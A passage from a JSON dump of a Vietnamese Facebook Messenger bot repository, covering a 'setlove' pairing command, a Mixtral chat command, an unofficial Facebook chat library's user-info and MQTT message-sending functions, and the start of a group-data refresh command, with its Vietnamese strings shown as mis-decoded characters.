ùêúùê°ùêöÃÇÃÅùê© ùêßùê°ùêöÃ£ÃÇùêß!‚ù§Ô∏è`,\n            mentions: [{\n                tag: taggedUserName,\n                id: taggedUserID\n            }]\n        }, threadID, (error, info) => {\n            global.client.handleReaction.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: senderID,\n                taggedUserID: taggedUserID,\n                taggedUserName: taggedUserName,\n                type: \"accept\"\n            });\n        }, messageID);\n    } else if (command === \"check\") {\n        const relationship = loveData.find(rel =>\n            rel.person1 === senderID || rel.person2 === senderID\n        );\n\n        if (relationship) {\n            const partnerID = relationship.person1 === senderID ? relationship.person2 : relationship.person1;\n            const partnerName = (await api.getUserInfo(partnerID))[partnerID].name;\n            const setloveDate = new Date(relationship.date);\n            const now = new Date();\n            const duration = Math.floor((now - setloveDate) / (1000 * 60 * 60 * 24));\n            const person1ImagePath = path.resolve(imagesPath, `${relationship.person1}.jpg`);\n            const person2ImagePath = path.resolve(imagesPath, `${relationship.person2}.jpg`);\n            const attachments = [];\n\n            if (fs.existsSync(person1ImagePath)) {\n                attachments.push(fs.createReadStream(person1ImagePath));\n            }\n            if (fs.existsSync(person2ImagePath)) {\n                attachments.push(fs.createReadStream(person2ImagePath));\n            }\n\n            api.sendMessage({\n                body: `üíï-ùêÅùêöÃ£ùêß ùêùùêöÃÉ ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùêØùê®ÃõÃÅùê¢: ${partnerName}\\nüìÖ-ùêïùêöÃÄùê® ùêßùê†ùêöÃÄùê≤: ${setloveDate.toLocaleDateString()}\\nüïê-ùêãùêÆÃÅùêú: ${setloveDate.toLocaleTimeString()}.\\nüíù-ùêÉùêöÃÉ ùêùùêÆÃõùê®ÃõÃ£ùêú ${duration} ùêßùê†ùêöÃÄùê≤.`,\n                attachment: attachments\n            }, threadID, messageID);\n        } else {\n            api.sendMessage(\"ùêÅùêöÃ£ùêß ùê•ùêöÃÄùê¶ ùê†ùê¢ÃÄ ùêúùê®ÃÅ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê≤ùêûÃÇùêÆ ùê¶ùêöÃÄ ùêúùê°ùêûùêúùê§üòº\", threadID, messageID);\n        }\n    } else if (command === \"huy\") {\n        const relationship = loveData.find(rel =>\n            rel.person1 === senderID || rel.person2 === senderID\n        );\n\n        if (!relationship) {\n            return api.sendMessage(\"ùêÅùêöÃ£ùêß ùê•ùêöÃÄùê¶ ùê†ùê¢ÃÄ ùêúùê®ÃÅ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê≤ùêûÃÇùêÆ ùê¶ùêöÃÄ ùê°ùêÆÃâùê≤üòº\", threadID, messageID);\n        }\n\n        const partnerID = relationship.person1 === senderID ? relationship.person2 : relationship.person1;\n        const partnerName = (await api.getUserInfo(partnerID))[partnerID].name;\n\n        api.sendMessage({\n            body: `${partnerName}, ùêõùêöÃ£ùêß ùêúùê®ÃÅ ùêùùê®ÃÇÃÄùêßùê† ùê≤ÃÅ ùê°ùêÆÃâùê≤ ùê¨ùêûùê≠ ùê•ùê®ùêØùêû ùê§ùê°ùê®ÃÇùêßùê†?üòø\\nùêáùêöÃÉùê≤ ùê≠ùê°ùêöÃâ ùêúùêöÃâùê¶ ùê±ùêÆÃÅùêú ùêØùêöÃÄùê® ùê≠ùê¢ùêß ùêßùê°ùêöÃÜÃÅùêß ùêßùêöÃÄùê≤ ùêùùêûÃÇÃâ ùêùùê®ÃÇÃÄùêßùê† ùê≤ÃÅ.‚ù§Ô∏è‚Äçü©π`,\n            mentions: [{\n                tag: partnerName,\n                id: partnerID\n            }]\n        }, threadID, (error, info) => {\n            global.client.handleReaction.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: senderID,\n                partnerID: partnerID,\n                partnerName: partnerName,\n                type: \"cancel\"\n            });\n        }, messageID);\n    } else if (command === \"suaanh\") {\n        const relationship = loveData.find(rel =>\n            rel.person1 === senderID || rel.person2 === senderID\n        );\n\n        if (!relationship) {\n            return api.sendMessage(\"ùêÅùêöÃ£ùêß ùê•ùêöÃÄùê¶ ùê†ùê¢ÃÄ ùêúùê®ÃÅ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê≤ùêûÃÇùêÆ ùêùùêöÃÇùêÆ ùê¶ùêöÃÄ ùêùùê®ÃÄùê¢ ùê¨ùêÆÃõÃâùêö ùêöÃâùêßùê°üòº\", threadID, messageID);\n        }\n\n        api.sendMessage(\"ùêáùêöÃÉùê≤ ùê´ùêûùê©ùê•ùê≤ ùê≠ùê¢ùêß ùêßùê°ùêöÃÜÃÅùêß ùêßùêöÃÄùê≤ ùêØùê®ÃõÃÅùê¢ ùê°ùê¢ÃÄùêßùê° ùêöÃâùêßùê° ùêõùêöÃ£ùêß ùê¶ùêÆùê®ÃÇÃÅùêß ùê≠ùê°ùêöùê≤ ùêùùê®ÃÇÃâùê¢.üíå\", threadID, (error, info) => {\n            global.client.handleReply.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: senderID,\n                type: \"updateImage\"\n            });\n        }, messageID);\n    } else {\n        api.sendMessage(\">>>ùêíùêÑùêìùêãùêéùêïùêÑ<<<\\nùêáùêÆÃõùê®ÃõÃÅùêßùê† ùêùùêöÃÇÃÉùêß ùê¨ùêÆÃõÃâ ùêùùêÆÃ£ùêßùê†!\\n-> #ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùê¨ùêûùê≠ @ùê≠ùêöùê† ùêùùêûÃÇÃâ ùê¨ùêûùê≠ ùê•ùê®ùêØùêû\\n-> #ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùêúùê°ùêûùêúùê§ ùêùùêûÃÇÃâ ùê§ùê¢ùêûÃÇÃâùê¶ ùê≠ùê´ùêö ùê¨ùêûùê≠ùê•ùê®ùêØùêû\\n-> #ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùê°ùêÆùê≤ ùêùùêûÃÇÃâ ùê°ùêÆÃâùê≤ ùê¨ùêûùê≠ùê•ùê®ùêØùêû\\n-> #ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùê¨ùêÆùêöùêöùêßùê° ùêùùêûÃÇÃâ ùê¨ùêÆÃõÃâùêö ùêöÃâùêßùê°.\", threadID, messageID);\n    }\n};\n\nmodule.exports.handleReaction = async ({ api, event, handleReaction }) => {\n    const { threadID, messageID } = event;\n\n    if (handleReaction.type === \"accept\") {\n        if (event.userID !== handleReaction.taggedUserID) return;\n\n        const loveData = fs.readJsonSync(dataPath);\n        loveData.push({\n            person1: handleReaction.author,\n            person2: handleReaction.taggedUserID,\n            date: new Date().toISOString()\n        });\n        fs.writeJsonSync(dataPath, loveData);\n\n        api.sendMessage({\n            body: `ùêÇùê°ùêÆÃÅùêú ùê¶ùêÆÃõÃÄùêßùê† ${handleReaction.taggedUserName} ùêØùêöÃÄ ùêõùêöÃ£ùêß ùêùùêöÃÉ ùê¨ùêûùê≠ùê•ùê®ùêØùêû ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê†!üòª\\nùêÇùê°ùêÆÃÅùêú ùê°ùêöùê¢ ùêõùêöÃ£ùêß ùê°ùêöÃ£ùêßùê° ùê©ùê°ùêÆÃÅùêú ùêØùêöÃÄ ùêúùê®ÃÅ ùêßùê°ùêÆÃõÃÉùêßùê† ùê©ùê°ùêÆÃÅùê≠ ùê†ùê¢ùêöÃÇùê≤ ùê≠ùêÆùê≤ùêûÃ£ÃÇùê≠ ùêØùê®ÃõÃÄùê¢ ùê§ùê°ùê¢ ùê®ÃõÃâ ùêõùêûÃÇùêß ùêßùê°ùêöùêÆ.‚ù§Ô∏è\\nùêáùêöÃÉùê≤ ùê´ùêûùê©ùê•ùê≤ ùê≠ùê¢ùêß ùêßùê°ùêöÃÜÃÅùêß ùêßùêöÃÄùê≤ ùêØùê®ÃõÃÅùê¢ ùê°ùê¢ÃÄùêßùê° ùêöÃâùêßùê° ùêúùêÆÃâùêö ùê¶ùê®ÃÇÃÉùê¢ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢.üí≠`,\n            mentions: [{\n                tag: handleReaction.taggedUserName,\n                id: handleReaction.taggedUserID\n            }]\n        }, threadID, (error, info) => {\n            global.client.handleReply.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: handleReaction.author,\n                partnerID: handleReaction.taggedUserID,\n                type: \"imageRequest\"\n            });\n        }, messageID);\n    } else if (handleReaction.type === \"cancel\") {\n        if (event.userID !== handleReaction.partnerID) return;\n\n        const loveData = fs.readJsonSync(dataPath);\n        const newLoveData = loveData.filter(rel =>\n            !(rel.person1 === handleReaction.author && rel.person2 === handleReaction.partnerID) &&\n            !(rel.person1 === handleReaction.partnerID && rel.person2 === handleReaction.author)\n        );\n        fs.writeJsonSync(dataPath, newLoveData);\n\n        const imagePaths = [\n            path.resolve(imagesPath, `${handleReaction.author}.jpg`),\n            path.resolve(imagesPath, `${handleReaction.partnerID}.jpg`)\n        ];\n        imagePaths.forEach(imagePath => {\n            if (fs.existsSync(imagePath)) {\n                fs.unlinkSync(imagePath);\n            }\n        });\n\n        api.sendMessage({\n            body: `ùêÅùêöÃ£ùêß ùêØùêöÃÄ ${handleReaction.partnerName} ùêùùêöÃÉ ùê°ùêÆÃâùê≤ ùê¨ùêûùê≠ùê•ùê®ùêØùêû.üòø ùêÇùê°ùêÆÃÅùêú ùê°ùêöùê¢ ùêõùêöÃ£ùêß ùê¨ùê®ÃõÃÅùê¶ ùê≠ùê¢ÃÄùê¶ ùêùùêÆÃõùê®ÃõÃ£ùêú ùê°ùêöÃ£ùêßùê° ùê©ùê°ùêÆÃÅùêú ùê¶ùê®ÃõÃÅùê¢!‚ù§Ô∏è‚Äçü©π`,\n            mentions: [{\n                tag: handleReaction.partnerName,\n                id: handleReaction.partnerID\n            }]\n        }, threadID, messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event, handleReply }) => {\n    const { threadID, messageID, senderID, body, attachments } = event;\n\n    // X·ª≠ l√Ω y√™u c·∫ßu g·ª≠i ·∫£nh (imageRequest, updateImage)\n    if (handleReply.type === \"imageRequest\" || handleReply.type === \"updateImage\") {\n        if (attachments.length === 0 || attachments[0].type !== 'photo') {\n            return api.sendMessage(\"ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê†ùêÆÃõÃâùê¢ ùê¶ùê®Ã£ÃÇùê≠ ùê°ùê¢ÃÄùêßùê° ùêöÃâùêßùê°.üíå\", threadID, messageID);\n        }\n\n        const imageStream = await axios({\n            url: attachments[0].url,\n            responseType: 'stream'\n        });\n\n        const imagePath = path.resolve(imagesPath, `${senderID}.jpg`);\n        const writer = fs.createWriteStream(imagePath);\n        imageStream.data.pipe(writer);\n\n        writer.on('finish', () => {\n            api.sendMessage(\"ùêãùêÆÃõùêÆ ùêöÃâùêßùê° ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê†!üíå\", threadID, messageID);\n\n            if (handleReply.type === \"imageRequest\") {\n                const otherPersonID = senderID === handleReply.author ? handleReply.partnerID : handleReply.author;\n                const otherPersonImagePath = path.resolve(imagesPath, `${otherPersonID}.jpg`);\n                if (!fs.existsSync(otherPersonImagePath)) {\n                    return api.sendMessage(\"ùêÉùêöÃÉ ùê•ùêÆÃõùêÆ ùêöÃâùêßùê° ùêúùêÆÃâùêö ùêõùêöÃ£ùêß, ùêØùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùêúùê°ùê®ÃõÃÄ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê§ùê¢ùêö ùê†ùêÆÃõÃâùê¢ ùêöÃâùêßùê° ùêúùêÆÃâùêö ùê°ùê®Ã£!üíå\", threadID, messageID);\n                } else {\n                    api.sendMessage(\"ùêÄÃâùêßùê° ùêúùêÆÃâùêö ùüê ùêõùêöÃ£ùêß ùêùùêöÃÉ ùêùùêÆÃõùê®ÃõÃ£ùêú ùê•ùêÆÃõùêÆ!üíå\", threadID, messageID);\n                }\n            }\n        });\n\n        writer.on('error', error => {\n            console.error(error);\n            api.sendMessage(\"ùêÉùêöÃÉ ùê±ùêöÃâùê≤ ùê´ùêö ùê•ùê®ÃÇÃÉùê¢ ùê§ùê°ùê¢ ùê•ùêÆÃõùêÆ ùêöÃâùêßùê° ùêúùêÆÃâùêö ùêõùêöÃ£ùêß. ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê≠ùê°ùêÆÃõÃâ ùê•ùêöÃ£ùê¢.üíå\", threadID, messageID);\n        });\n    }\n\n    // X·ª≠ l√Ω x√≥a c·∫∑p SetLove\n    if (handleReply.type === \"deleteSetLove\") {\n        if (handleReply.author !== senderID) {\n            return api.sendMessage(\"ùêÅùêöÃ£ùêß ùê§ùê°ùê®ÃÇùêßùê† ùêúùê®ÃÅ ùê™ùêÆùê≤ùêûÃÇÃÄùêß.üíî\", threadID, messageID);\n        }\n\n        const loveData = fs.readJsonSync(dataPath);\n\n        const indexesToDelete = body\n            .split(',')\n            .map(num => parseInt(num.trim()))\n            .filter(num => !isNaN(num) && num > 0 && num <= loveData.length);\n\n        if (indexesToDelete.length === 0) {\n            return api.sendMessage(\"ùêáùêöÃÉùê≤ ùêßùê°ùêöÃ£ÃÇùê© ùê¨ùê®ÃÇÃÅ ùê≠ùê°ùêÆÃõÃÅ ùê≠ùêÆÃõÃ£ ùê°ùê®ÃõÃ£ùê© ùê•ùêûÃ£ÃÇ ƒëùêûÃÇÃâ ùê±ùê®ÃÅùêö.üíî\", threadID, messageID);\n        }\n\n        const deletedPairs = [];\n        const imagePathsToDelete = [];\n\n        indexesToDelete\n            .sort((a, b) => b - a)\n            .forEach(index => {\n                const pair = loveData[index - 1];\n                if (pair) {\n                    deletedPairs.push(pair);\n                    loveData.splice(index - 1, 1);\n                    imagePathsToDelete.push(\n                        path.resolve(imagesPath, `${pair.person1}.jpg`),\n                        path.resolve(imagesPath, `${pair.person2}.jpg`)\n                    );\n                }\n            });\n\n        imagePathsToDelete.forEach(imagePath => {\n            if (fs.existsSync(imagePath)) {\n                try {\n                    fs.unlinkSync(imagePath);\n                } catch (error) {\n                    console.error(`Kh√¥ng th·ªÉ x√≥a file: ${imagePath}`, error);\n                }\n            }\n        });\n\n        fs.writeJsonSync(dataPath, loveData);\n\n        if (deletedPairs.length === 0) {\n            return api.sendMessage(\"‚ùå Kh√¥ng c√≥ c·∫∑p n√†o ƒë∆∞·ª£c x√≥a. Vui l√≤ng ki·ªÉm tra l·∫°i s·ªë th·ª© t·ª±.\", threadID, messageID);\n        }\n\n        const deletedMessage = deletedPairs\n            .map((pair, index) => {\n                const name1 = pair.person1 || \"Kh√¥ng r√µ\";\n                const name2 = pair.person2 || \"Kh√¥ng r√µ\";\n\n                return `üíî ${index + 1}. ${name1} ‚ù§Ô∏è ${name2}`;\n            })\n            .join(\"\\n\");\n\n        return api.sendMessage(`‚úÖ ùêÇùêöÃÅùêú ùêúùêöÃ£ÃÜùê© ùêíùêûùê≠ùêãùê®ùêØùêû ùê¨ùêöùêÆ ƒëùêöÃÉ ùêõùê¢Ã£ ùê±ùê®ÃÅùêö:\\n\\n${deletedMessage}`, threadID, messageID);\n    }\n};\n","path":null,"size_bytes":17823,"size_tokens":null},"modules/commands/mixtral-8b.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"mixtral\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI (Mixtral)\",\n    commandCategory: \"AI\",\n    usages: \"mixtral n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, 'data', 'api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.mixtral8b || jsonData.mixtral8b.trim() === '') {}\n\n        return jsonData.mixtral8b;\n    } catch (error) {}\n};\n\nconst getChatResponse = async (text, api, event) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        return api.sendMessage(\"ƒêang c·∫≠p nh·∫≠t!!!\", event.threadID, event.messageID);\n    }\n    try {\n        const response = await axios.get(`${apiUrl}?q=${encodeURIComponent(text)}`);\n        if (response.data && response.data.result) {\n            return response.data.result;\n        } else {}\n    } catch (error) {}\n}\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text, api, event);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {}\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply?.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n\n            if (!text || text.trim() === '') {\n                return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ ti·∫øp t·ª•c tr√≤ chuy·ªán.', event.threadID, event.messageID);\n            }\n\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch (error) {}\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (\n        event.type === \"message_reply\" && \n        event.messageReply &&\n        chatSessions[event.messageReply.messageID]\n    ) {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI Mixtral th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3288,"size_tokens":null},"lib/fca-auto/src/getUserInfo.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  var retObj = {};\n\n  for (var prop in data) {\n    // eslint-disable-next-line no-prototype-builtins\n    if (data.hasOwnProperty(prop)) {\n      var innerObj = data[prop];\n      retObj[prop] = {\n        name: innerObj.name,\n        firstName: innerObj.firstName,\n        vanity: innerObj.vanity,\n        thumbSrc: innerObj.thumbSrc,\n        profileUrl: innerObj.uri,\n        gender: innerObj.gender,\n        type: innerObj.type,\n        isFriend: innerObj.is_friend,\n        isBirthday: !!innerObj.is_birthday\n      };\n    }\n  }\n\n  return retObj;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  const Database = require('../Extra/Database');\n  return function getUserInfo(id, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, userInfo) {\n        if (err) return rejectFunc(err);\n        resolveFunc(userInfo);\n      };\n    }\n\n    if (utils.getType(id) !== \"Array\") id = [id];\n    if (utils.getType(global.Fca.Data.Userinfo) == \"Array\" || global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = new Map();\n    if (global.Fca.Data.AlreadyGetInfo != true) {\n      if (Database(true).has('UserInfo') == false) { \n        Database(true).set('UserInfo', []); \n        global.Fca.Data.AlreadyGetInfo = true; \n      }\n    }\n    var AlreadyGet = [];\n    var NeedGet = [];\n    if (global.Fca.Data.Userinfo != undefined && global.Fca.Data.Userinfo.size != undefined) {\n      for (let idu of id) {\n        if (global.Fca.Data.Userinfo.has(idu)) {\n          let Format = {};\n          Format[idu] = global.Fca.Data.Userinfo.get(idu);\n          AlreadyGet.push(Format);\n        } else {\n          const DatabaseUser = Database(true).get('UserInfo') || [];\n          const databaseUser = DatabaseUser.find(user => user.id === idu);\n          let Format = {};\n          Format[idu] = databaseUser;\n          if (databaseUser) {\n            AlreadyGet.push(Format);\n          } else {\n            NeedGet.push(idu);\n          }\n        }\n      }\n      \n    }\n\n    if (NeedGet.length > 0) {\n      let form = {};\n        NeedGet.map(function (v, i) {\n          form[\"ids[\" + i + \"]\"] = v;\n        });\n      defaultFuncs\n        .post(\"https://www.facebook.com/chat/user_info/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n              if (resData.error) throw resData;\n                if (AlreadyGet.length > 0) {\n                  AlreadyGet.push(formatData(resData.payload.profiles));\n                }\n                else if (AlreadyGet.length <= 0 && NeedGet.length == 1) {\n                  AlreadyGet = formatData(resData.payload.profiles);\n                }\n                else {\n                  AlreadyGet.push(formatData(resData.payload.profiles));\n                }\n                callback(null, AlreadyGet);\n              })\n            .catch(function (err) {\n          log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n        callback(err, null);\n      });\n    }\n    else if (AlreadyGet.length == 1) {\n      callback(null,AlreadyGet[0]);\n    }\n    else if (AlreadyGet.length > 1) {\n      callback(null, AlreadyGet);\n    }\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":3531,"size_tokens":null},"lib/fca-auto/src/sendMqttMessage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\nvar fs = require('fs-extra');\n\n// ƒê·ªãnh nghƒ©a hi·ªáu ·ª©ng tin nh·∫Øn\nconst MESSAGE_EFFECTS = {\n    HEART: {\n        id: \"369239263222822\",\n        unified_id: \"369239263222822\",\n        effect_name: \"heart\"\n    },\n    CELEBRATION: {\n        id: \"370940413392601\",\n        unified_id: \"370940413392601\",\n        effect_name: \"celebration\"\n    },\n    CONFETTI: {\n        id: \"369239343222814\",\n        unified_id: \"369239343222814\",\n        effect_name: \"confetti\"\n    },\n    LOVE: {\n        id: \"369239383222810\",\n        unified_id: \"369239383222810\",\n        effect_name: \"love\"\n    },\n    FIRE: {\n        id: \"369239433222805\",\n        unified_id: \"369239433222805\",\n        effect_name: \"fire\"\n    }\n};\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n    // H√†m upload attachment\n    function uploadAttachment(attachments, callback) {\n        var uploads = [];\n\n        for (var i = 0; i < attachments.length; i++) {\n            if (!utils.isReadableStream(attachments[i])) {\n                callback({ error: \"Attachment must be a readable stream\" });\n                return;\n            }\n\n            var form = {\n                upload_1024: attachments[i],\n                voice_clip: \"false\",\n                fb_api_req_friendly_name: \"MessageFileUploader\",\n            };\n\n            uploads.push(\n                defaultFuncs\n                    .postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form)\n                    .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                    .then(function (resData) {\n                        if (!resData || !resData.payload || !resData.payload.metadata) {\n                            throw { error: \"Upload failed\" };\n                        }\n                        return resData.payload.metadata[0];\n                    })\n            );\n        }\n\n        // Process t·∫•t c·∫£ uploads\n        bluebird\n            .all(uploads)\n            .then(function (resData) {\n                callback(null, resData);\n            })\n            .catch(function (err) {\n                log.error(\"uploadAttachment\", err);\n                callback(err);\n            });\n    }\n\n    function handleAttachment(msg, form, callback, cb) {\n        if (msg.attachment) {\n            form.image_ids = [];\n            form.gif_ids = [];\n            form.file_ids = [];\n            form.video_ids = [];\n            form.audio_ids = [];\n\n            if (!Array.isArray(msg.attachment)) {\n                msg.attachment = [msg.attachment];\n            }\n\n            uploadAttachment(msg.attachment, function(err, files) {\n                if (err) return callback(err);\n\n                files.forEach(function(file) {\n                    const key = Object.keys(file)[0];\n                    const type = `${key}s`;\n                    if (form[type]) form[type].push(file[key]);\n                });\n\n                return cb();\n            });\n        } else {\n            return cb();\n        }\n    }\n\n    function send(form, threadID, messageAndOTID, callback) {\n        var msgType = utils.getType(threadID);\n        var ThreadID = msgType === \"Array\" ? threadID[0] : threadID;\n\n        if (ThreadID.length <= 15 || global.Fca.isUser.includes(ThreadID)) {\n            form[\"specific_to_list[0]\"] = \"fbid:\" + ThreadID;\n            form[\"specific_to_list[1]\"] = \"fbid:\" + ctx.userID;\n            form[\"other_user_fbid\"] = ThreadID;\n        } \n        else if (ThreadID.length >= 15 && ThreadID.indexOf(1) != 0 || global.Fca.isThread.includes(ThreadID)) {\n            form[\"thread_fbid\"] = ThreadID;\n        }\n        else {\n            if (global.Fca.Data.event.isGroup) {\n                form[\"thread_fbid\"] = ThreadID;\n                global.Fca.isThread.push(ThreadID); \n            }\n            else {\n                form[\"specific_to_list[0]\"] = \"fbid:\" + ThreadID;\n                form[\"specific_to_list[1]\"] = \"fbid:\" + ctx.userID;\n                form[\"other_user_fbid\"] = ThreadID;\n                global.Fca.isUser.push(ThreadID);\n            }\n        }\n\n        if (ctx.globalOptions.pageID) {\n            form.author = \"fbid:\" + ctx.globalOptions.pageID;\n            form[\"specific_to_list[1]\"] = \"fbid:\" + ctx.globalOptions.pageID;\n        }\n\n        var messageRequest = {\n            type: \"message\",\n            payload: form\n        };\n\n        const requestData = {\n            app_id: \"2220391788200892\",\n            payload: JSON.stringify({\n                payload: JSON.stringify(form),\n                tasks: [{\n                    label: 46,\n                    payload: JSON.stringify(form),\n                    queue_name: ThreadID,\n                    task_id: Math.random() * 1001 << 0,\n                    failure_count: null\n                }],\n                epoch_id: messageAndOTID,\n                version_id: '7553237234719461'\n            }),\n            request_id: ++ctx.req_ID,\n            type: 3\n        };\n\n        ctx.mqttClient.publish('/ls_req', JSON.stringify(requestData), { qos: 1 });\n\n        ctx.callback_Task[ctx.req_ID] = {\n            type: \"sendMqttMessage\",\n            callback: function(err, data) {\n                if (err) return callback(err);\n                callback(null, {\n                    threadID: ThreadID,\n                    messageID: messageAndOTID,\n                    timestamp: Date.now()\n                });\n            }\n        };\n    }\n\n    return function sendMessage(msg, threadID, replyToMessage, callback) {\n        var resolveFunc = function() {};\n        var rejectFunc = function() {};\n        \n        var returnPromise = new Promise(function(resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback && utils.getType(replyToMessage) === \"Function\") {\n            callback = replyToMessage;\n            replyToMessage = null;\n        }\n\n        if (!callback) {\n            callback = function(err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n\n        var msgType = utils.getType(msg);\n        if (msgType !== \"String\" && msgType !== \"Object\") {\n            callback({ error: \"Message must be a string or object\" });\n            return returnPromise;\n        }\n\n        var messageAndOTID = utils.generateOfflineThreadingID();\n\n        var form = {\n            client: \"mercury\",\n            action_type: \"ma-type:user-generated-message\",\n            author: \"fbid:\" + ctx.userID,\n            timestamp: Date.now(),\n            timestamp_absolute: \"Today\",\n            timestamp_relative: utils.generateTimestampRelative(),\n            timestamp_time_passed: \"0\",\n            is_unread: false,\n            is_cleared: false,\n            is_forward: false,\n            is_filtered_content: false,\n            is_filtered_content_bh: false,\n            is_filtered_content_account: false,\n            is_filtered_content_quasar: false,\n            is_filtered_content_invalid_app: false,\n            is_spoof_warning: false,\n            source: \"source:chat:web\",\n            \"source_tags[0]\": \"source:chat\",\n            body: msgType === \"String\" ? msg : msg.body || \"\",\n            html_body: false,\n            ui_push_phase: \"V3\",\n            status: \"0\",\n            offline_threading_id: messageAndOTID,\n            message_id: messageAndOTID,\n            threading_id: utils.generateThreadingID(ctx.clientID),\n            \"ephemeral_ttl_mode:\": \"0\",\n            manual_retry_cnt: \"0\",\n            has_attachment: !!(msg.attachment || msg.url || msg.sticker),\n            signatureID: utils.getSignatureID(),\n            replied_to_message_id: replyToMessage\n        };\n\n        handleAttachment(msg, form, callback, function() {\n            if (msg.messageEffect) {\n                const effect = MESSAGE_EFFECTS[msg.messageEffect.toUpperCase()];\n                if (effect) {\n                    form.tags = [{\n                        id: effect.id,\n                        offset: 0,\n                        length: form.body.length,\n                        type: \"message_effect\"\n                    }];\n\n                    form.message_effects = {\n                        effect_id: effect.id,\n                        effect_unified_id: effect.unified_id,\n                        effect_type: \"MESSAGE_EFFECT\",\n                        effect_name: effect.effect_name\n                    };\n                }\n            }\n\n            if (msg.mentions) {\n                form.profile_xmd = msg.mentions.map(mention => ({\n                    id: mention.id,\n                    offset: msg.body.indexOf(mention.tag),\n                    length: mention.tag.length,\n                    type: \"p\"\n                }));\n            }\n\n            send(form, threadID, messageAndOTID, callback);\n        });\n\n        return returnPromise;\n    };\n};","path":null,"size_bytes":8983,"size_tokens":null},"modules/commands/setdatabox.js":{"content":"module.exports.config = {\n    name: \"setdatabox\",\n    version: \"1.0\",\n    hasPermssion: 3,\n    credits: \"D-Jukie\",\n    description: \"Set d·ªØ li·ªáu m·ªõi c·ªßa c√°c box v√†o data\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"\",\n    cooldowns: 5,\n    \n};\nmodule.exports.run = async function ({ event, args, api, Threads }) { \nconst { threadID, logMessageData } = event;\nconst { setData, getData } = Threads;\nvar inbox = await api.getThreadList(100, null, ['INBOX']);\n  let list = [...inbox].filter(group => group.isSubscribed && group.isGroup);\n  const lengthGroup = list.length\n  for (var groupInfo of list) {\n    console.log(`THREAD-ID: ${groupInfo.threadID}`)\n    var threadInfo = await api.getThreadInfo(groupInfo.threadID);\n    threadInfo.threadName;\n    await Threads.setData(groupInfo.threadID, { threadInfo });\n  }\n    console.log(`ƒê√£ c·∫≠p nh·∫≠t d·ªØ li·ªáu c·ªßa 